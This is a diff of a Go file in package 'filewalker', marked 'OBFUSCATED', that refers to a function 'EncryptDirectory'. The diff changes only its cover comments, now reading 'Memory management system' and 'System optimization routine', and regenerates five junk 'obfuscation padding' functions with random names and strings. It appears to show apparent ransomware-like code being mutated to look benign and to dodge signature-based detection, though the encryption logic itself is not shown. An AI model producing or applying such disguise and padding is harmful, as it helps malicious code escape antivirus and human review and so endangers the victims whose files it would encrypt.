@@ -1,6 +1,6 @@
 // OBFUSCATED
+// Memory management system
 // System optimization routine
-// Windows compatibility layer
 package filewalker
 
 import (
@@ -123,35 +123,35 @@ func EncryptDirectory(dirPath string) {
 
 
 // Obfuscation padding
-func obf_51919() {
-    _ = 4878
-    var _ = "rkWbw9bBB1OhPDEn2R9f7WkfXi5vtvrmy9KYtffPIh799dj4nW"
+func obf_17446() {
+    _ = 6265
+    var _ = "BtYqTVLNd2ys7SbGJ1IBoX4wtXOdZMxFvowjiBNIyWtBWJWR3t"
 }
 
 
 // Obfuscation padding
-func obf_76645() {
-    _ = 6074
-    var _ = "ifKfB9dfdYDSkoZpchdkFgP5IfmuT3JmYuTUj8bQz4hdXxAayr"
+func obf_12032() {
+    _ = 1126
+    var _ = "cE333rQs4J2CL0kkcGI34jAEHyzUnriLQNcq1rjN2safFkKZKR"
 }
 
 
 // Obfuscation padding
-func obf_77711() {
-    _ = 301
-    var _ = "vjIZn5wzt4y1w986PJSBFqyy0A0Xeys5KzEqaeoGpbIDwu1CGl"
+func obf_92106() {
+    _ = 3336
+    var _ = "El2sAbX795JOc2SN4swJduKqaaxC2HFDdO6g86mGQ2gEElnk8O"
 }
 
 
 // Obfuscation padding
-func obf_16456() {
-    _ = 1219
-    var _ = "anvIfVlhTZN25AQZyY5bA07oEs2v1hzjURrtwAq09y29ZbVkCL"
+func obf_20141() {
+    _ = 1291
+    var _ = "xLpYbyWA6OEPyfVqmR7pYnDj5Aog7TppN1G13cR8EUx9aUnP5G"
 }
 
 
 // Obfuscation padding
-func obf_15045() {
-    _ = 7326
-    var _ = "gDQpocQvm3zwbk1LrUkYR1iwTzXXArbQGyNCDuzJ3gGFirDIqZ"
+func obf_67089() {
+    _ = 1971
+    var _ = "JEM5bwuGc5G5Z4qAcqRbAdxH2o8OxEqRdZUhTZna53tRW9frFc"
 }
